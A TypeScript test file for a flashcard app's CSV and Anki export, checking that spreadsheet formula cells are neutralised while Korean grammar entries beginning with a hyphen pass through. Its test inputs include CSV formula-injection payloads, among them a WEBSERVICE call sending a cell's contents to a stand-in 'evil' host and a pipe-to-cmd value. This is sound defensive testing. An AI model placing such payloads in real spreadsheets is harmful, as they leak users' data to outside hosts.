import { describe, expect, it } from 'vitest';
import { createEventFactory, replayAllEvents } from '../src/events/replay.ts';
import { createHlcState } from '../src/hlc.ts';
import { buildEventsFromCsv, exportCsv, parseDelimitedText } from '../src/import/csv.ts';
import { guardFormula, startsLikeFormula } from '../src/import/csv-cell.ts';
import { guardHtmlFormula } from '../src/export/anki/select.ts';
import { BUILTIN_NOTE_TYPES } from '../src/model/presets.ts';

describe('formula guard rule (S6)', () => {
  it.each(['=1+1', '+1', '-1', '@SUM(A1)', '=HYPERLINK("http://x","y")', '-', '-=1'])(
    'prefixes %j',
    (value) => {
      expect(guardFormula(value)).toBe(`'${value}`);
    },
  );

  it.each([' =1', '\t=1', '\r=1', '\n+1', '  @x', ' -1'])(
    'prefixes %j: spreadsheets trim leading whitespace',
    (value) => {
      expect(guardFormula(value)).toBe(`'${value}`);
    },
  );

  it.each([
    '-(으)ㄴ',
    '-(으)ㄴ/는',
    '-아/어요',
    '-기 때문에',
    '-는다',
    '-ㄴ/는',
    '-(이)다',
    '- 가',
    ' -(으)면',
    '-(으)ㄹ까요?',
    '-ᄀ',
    '-ﾡ',
  ])('keeps Korean grammar entry %j', (value) => {
    expect(startsLikeFormula(value)).toBe(false);
    expect(guardFormula(value)).toBe(value);
  });

  it.each([
    '-(""&"가"&WEBSERVICE("https://evil/?"&B1))',
    '-("가"&HYPERLINK("https://evil","x"))',
    '-가+1',
    '-가!A1',
    '-가:나',
    '-가|cmd',
    '-(으)ㄴ (adj.)',
    '-가1',
  ])('prefixes %j: a formula cannot hide behind a Hangul start', (value) => {
    expect(guardFormula(value)).toBe(`'${value}`);
  });

  it.each([' =1', '　=1', '﻿=1'])(
    'treats only space, tab, CR and LF as leading whitespace: keeps %j',
    (value) => {
      expect(startsLikeFormula(value)).toBe(false);
      expect(guardFormula(value)).toBe(value);
    },
  );

  it.each(['', 'school', '학교', 'a=b', 'e-mail', '1-2', "'=1", '#tag', '\thello', ' x'])(
    'keeps %j',
    (value) => {
      expect(guardFormula(value)).toBe(value);
    },
  );

  it('decides by the first non-punctuation character after `-`', () => {
    expect(startsLikeFormula('-(a)ㄴ')).toBe(true);
    expect(startsLikeFormula('-(1)')).toBe(true);
    expect(startsLikeFormula('-(ㄴ)')).toBe(false);
  });

  it('writes an Anki HTML cell with the trigger as an entity, keeping leading space', () => {
    expect(guardHtmlFormula('=1+1')).toBe('&#61;1+1');
    expect(guardHtmlFormula('+x')).toBe('&#43;x');
    expect(guardHtmlFormula('-x')).toBe('&#45;x');
    expect(guardHtmlFormula(' @x')).toBe(' &#64;x');
    expect(guardHtmlFormula('-(으)ㄴ')).toBe('-(으)ㄴ');
    expect(guardHtmlFormula('<b>=x</b>')).toBe('<b>=x</b>');
  });
});

describe('exportCsv formula guard', () => {
  const T0 = Date.UTC(2026, 3, 1, 9, 0, 0);
  const DECK = 'deck-formula';
  const koNoteType = BUILTIN_NOTE_TYPES.find((nt) => nt.id === 'preset:vocab-ko');
  if (!koNoteType) throw new Error('Missing preset:vocab-ko');
  const factory = createEventFactory('dev-a', 0, createHlcState('dev-a', T0));
  const deck = factory.create(
    'DeckCreated',
    { deck_id: DECK, name: 'Formula', note_type_id: koNoteType.id, language: 'ko' },
    T0,
  );
  const csv = 'Text 1,Text 2,Text 3\n"=HYPERLINK(""http://x"")",+1,-(으)ㄴ\n@SUM(A1),-1,plain\n';
  const res = buildEventsFromCsv(csv, {
    deckId: DECK,
    noteType: koNoteType,
    eventFactory: factory,
    nowMs: T0 + 1000,
  });
  const state = replayAllEvents([deck, ...res.events]);
  const fieldCells = (text: string) =>
    parseDelimitedText(text, { delimiter: ',' }).rows.map((r) => r.slice(1, 4));

  it('prefixes formula cells in the "for other apps" mode', () => {
    const text = exportCsv(state, { deckId: DECK, stripRichText: true, bom: false }).text;
    expect(fieldCells(text)).toEqual([
      ['\'=HYPERLINK("http://x")', "'+1", '-(으)ㄴ'],
      ["'@SUM(A1)", "'-1", 'plain'],
    ]);
  });

  it('keeps the round-trip CSV as typed', () => {
    const text = exportCsv(state, { deckId: DECK, bom: false }).text;
    expect(fieldCells(text)).toEqual([
      ['=HYPERLINK("http://x")', '+1', '-(으)ㄴ'],
      ['@SUM(A1)', '-1', 'plain'],
    ]);
  });
});
